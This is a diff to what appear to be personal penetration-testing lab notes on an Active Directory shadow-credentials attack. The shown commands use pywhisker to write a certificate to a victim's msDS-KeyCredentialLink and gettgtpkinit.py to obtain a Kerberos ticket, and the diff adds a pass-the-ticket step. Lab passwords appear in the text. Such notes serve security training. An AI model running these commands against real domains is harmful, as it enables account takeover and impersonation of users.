@@ -9,6 +9,8 @@ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5sh
 
 - generates `x.506 cert` and writes it to the victim users `msds-keycredentiallink`
 
+
+
 # aquire a tgt
 ```
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
@@ -16,7 +18,11 @@ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6
 
 
 
-
+# ptt
+```
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+```
 
 
 
